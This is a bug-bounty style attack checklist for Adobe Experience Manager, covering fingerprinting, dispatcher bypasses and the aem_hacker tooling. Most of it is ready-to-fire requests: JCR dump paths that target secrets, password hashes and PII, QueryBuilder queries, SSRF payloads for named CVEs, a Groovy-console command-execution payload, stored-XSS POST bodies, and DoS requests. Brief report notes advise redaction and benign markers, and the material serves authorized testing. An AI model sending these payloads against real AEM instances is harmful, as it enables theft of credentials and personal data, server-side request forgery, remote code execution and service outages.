# Adobe Experience Manager (AEM)

**What it is:** AEM exposes a large default attack surface (Sling servlets, JCR repository, dispatcher) that misconfigured instances leave reachable → JCR content/secret dump, SSRF, XSS, and RCE via the Groovy console. The dispatcher is a filter you bypass with selector/extension tricks.

## Where to look
- [ ] Fingerprint: `nuclei tech-detect` (`technologies/tech-detect.yaml`), `/etc.clientlibs`, `/libs/granite`, `/system/console`, `X-Adobe` hints.
- [ ] Run `aem_hacker`: `python3 aem_hacker.py -u https://example --host <your-vps>`
- [ ] Fuzz AEM paths: `https://github.com/clarkvoss/AEM-List/blob/main/paths`

## Tooling
- `https://github.com/0ang3el/aem-hacker` (`aem_hacker.py`, `aem_discovery.py`, `aem_enum.py`, `aem_ssrf2rce.py`, `aem_server.py`)
- `https://github.com/0ang3el/aem-rce-bundle`
- Talk/video: https://www.youtube.com/watch?v=EQNBQCQMouk

## Dispatcher bypass (reach blocked servlets)
- [ ] **CVE-2016-0957 QueryBuilder bypass** — extension/selector append and CRLF:
```
/bin/querybuilder.json            => blocked
/bin/querybuilder.json/a.css      => allowed
/bin/querybuilder.json/a.html     => allowed
/bin/querybuilder.json;%0aa.css   => allowed
/bin/querybuilder.json/a.1.json   => allowed
```
- [ ] Servlet-selector + path-normalization bypasses:
```
/bin/querybuilder.json.servlet.css   => allowed
/bin/querybuilder.json.servlet.html  => allowed
///etc.json                          (instead of /etc.json)
///bin///querybuilder.json           (instead of /bin/querybuilder.json)
```
- [ ] More filter bypasses (from field notes): `/conten/.1.json`, `/conten/t.1.json`, `/content.tidy.1.json`, `/conten/.tidy.infinity.json`.

## JCR repository dump (secrets / PII / usernames)
- [ ] DefaultGETServlet dumps nodes+props. Enumerate from `jcr:root`:
```
/.1.json   /.ext.json   /.childrenlist.json
/etc.json  /etc.s.json  /etc.-1.json
/tidy.3.json   (tidy selector, depth 3, json format)
```
- [ ] Interesting nodes: `/etc` (secrets, enc keys), `/apps/system/config` + `/apps/<x>/config` (passwords), `/var` (PII), `/home` (password hashes, PII).
- [ ] Username-leaking props: `jcr:createdBy`, `jcr:lastModifiedBy`, `cq:LastModifiedBy`.
- [ ] **QueryBuilder searches:**
```
/bin/querybuilder.json?type=nt:file&nodename=*.zip
/bin/querybuilder.json?path=/home&p.hits=full&p.limit=-1
/bin/querybuilder.json?hasPermission=jcr:write&path=/content
/bin/querybuilder.json?path=/etc&path.flat=true&p.nodedepth=0
/bin/querybuilder.json?path=/etc/replication/agents.author&p.hits=full&p.nodedepth=-1
```

## SSRF
- [ ] Opensocial proxy: `/libs/opensocial/proxy?container=default&url=http://target`, `/libs/shindig/proxy?container=default&url=http://target`
- [ ] **CVE-2018-12809 ReportingServicesProxyServlet:**
```
/libs/cq/contentinsight/content/proxy.reportingservices.json?url=http://target%23/apil.omniture.com/a&q=a
/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url=http://target%23/apil.omniture.com/a&q=a
/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://target&customer_key=zzz&customer_secret=zzz&redirect_uri=xxx&code=e
```
- [ ] SiteCatalystServlet: `/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet`, `/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json`

## RCE
- [ ] **Exposed Groovy console** — `POST /bin/groovyconsole/post.servlet` with `script=` running `"cmd".execute()`. High severity, confirm carefully:
```
script=def proc = "id".execute()%0d%0aprintln proc.text
```

## XSS
```
POST /content/usergenerated/etc/commerce/smartlists/xss
aaa.html=alert('xss on '+document.domain)%3b

POST /content/usergenerated/etc/commerce/smartlists/xssed
jcr:data=alert('xss on '+document.domain)%3b&jcr:mimeType=text/html
```

## DoS (report only where in scope; do not run against prod)
```
/.ext.infinity.json?tidy=true
/bin/querybuilder.json?type=nt:base&p.limit=-1
/bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix=
/system/bgservlets/test.json?cycles=999999&interval=0&flushEvery=111111111
```

## Impact
JCR dump → hardcoded secrets/keys/PII; SSRF → cloud metadata (`09-advanced/06`); Groovy console → RCE.

## Report notes
Prove JCR access with a non-sensitive node listing; redact any real secrets. Groovy RCE: run a benign marker (`id`, `hostname`) only. Never run the DoS payloads against production.
